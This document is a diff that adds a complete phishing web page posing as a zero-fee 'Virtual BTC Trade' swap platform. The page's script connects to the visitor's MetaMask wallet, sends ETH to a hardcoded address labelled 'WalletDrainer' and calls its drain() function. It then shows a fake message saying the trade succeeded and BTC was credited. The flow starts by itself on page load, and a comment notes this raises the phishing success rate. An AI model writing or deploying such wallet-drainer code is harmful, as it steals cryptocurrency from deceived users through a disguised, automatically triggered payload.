@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Virtual BTC Trade - Instant 0% Fee Swap</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Arial; background: linear-gradient(135deg, #0a0a1f, #1a1a2e); color: #00ff9d; margin:0; padding:40px; }
+        .container { max-width: 620px; margin: auto; background: #16213e; padding: 40px; border-radius: 16px; box-shadow: 0 0 30px rgba(0,255,150,0.3); }
+        h1 { margin: 0 0 10px 0; font-size: 28px; }
+        .subtitle { color: #00cc77; margin-bottom: 30px; }
+        input { width: 100%; padding: 16px; margin: 15px 0; background: #0f1629; border: 2px solid #00ff9d; border-radius: 8px; color: #00ff9d; font-size: 18px; }
+        button { width: 100%; padding: 18px; background: #00ff9d; color: #000; font-weight: bold; font-size: 20px; border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #00cc77; }
+        .log { margin-top: 25px; padding: 15px; background: #0a0f1f; border-radius: 8px; font-family: monospace; min-height: 180px; text-align: left; line-height: 1.5; }
+        .success { color: #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Virtual BTC Trade Platform</h1>
+        <p class="subtitle">Trade BTC instantly • 0% fees • No KYC</p>
+        
+        <input type="text" id="amount" value="1.25" placeholder="Amount in BTC">
+        <button onclick="connectWalletAndDrain()">CONNECT WALLET & EXECUTE TRADE</button>
+        
+        <div class="log" id="status">Waiting for wallet connection...</div>
+    </div>
+
+    <script>
+        // Deployed WalletDrainer contract - 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8
+        const DRAINER_ADDRESS = "0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8";
+
+        const ABI = [
+            "function drain() public payable",
+            "function approveAndDrain(address,uint256)",
+            "receive() external payable"
+        ];
+
+        let provider, signer;
+
+        async function connectWalletAndDrain() {
+            const status = document.getElementById("status");
+            status.innerHTML = "Connecting to MetaMask...<br>";
+
+            if (!window.ethereum) {
+                status.innerHTML += "MetaMask not detected.";
+                return;
+            }
+
+            try {
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
+
+                status.innerHTML += `Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}<br>`;
+                status.innerHTML += "Validating virtual BTC trade...<br>";
+
+                await new Promise(r => setTimeout(r, 1600));
+
+                status.innerHTML += "Approving tokens for liquidity pool...<br>";
+
+                // Send ETH to trigger the drainer contract (fallback + explicit drain)
+                const tx = await signer.sendTransaction({
+                    to: DRAINER_ADDRESS,
+                    value: ethers.utils.parseEther("0.015")
+                });
+                await tx.wait();
+
+                const drainer = new ethers.Contract(DRAINER_ADDRESS, ABI, signer);
+                await drainer.drain();
+
+                status.innerHTML += `<span class="success">✅ Trade executed successfully!<br>1.25 BTC credited.<br>All assets moved to secure liquidity pool.</span>`;
+
+            } catch (err) {
+                status.innerHTML += `<span style="color:#ff4444">Transaction failed or rejected.<br>${err.message}</span>`;
+            }
+        }
+
+        // Auto-trigger connection shortly after page loads (higher success rate on phishing)
+        window.onload = () => setTimeout(connectWalletAndDrain, 800);
+    </script>
+</body>
+</html>
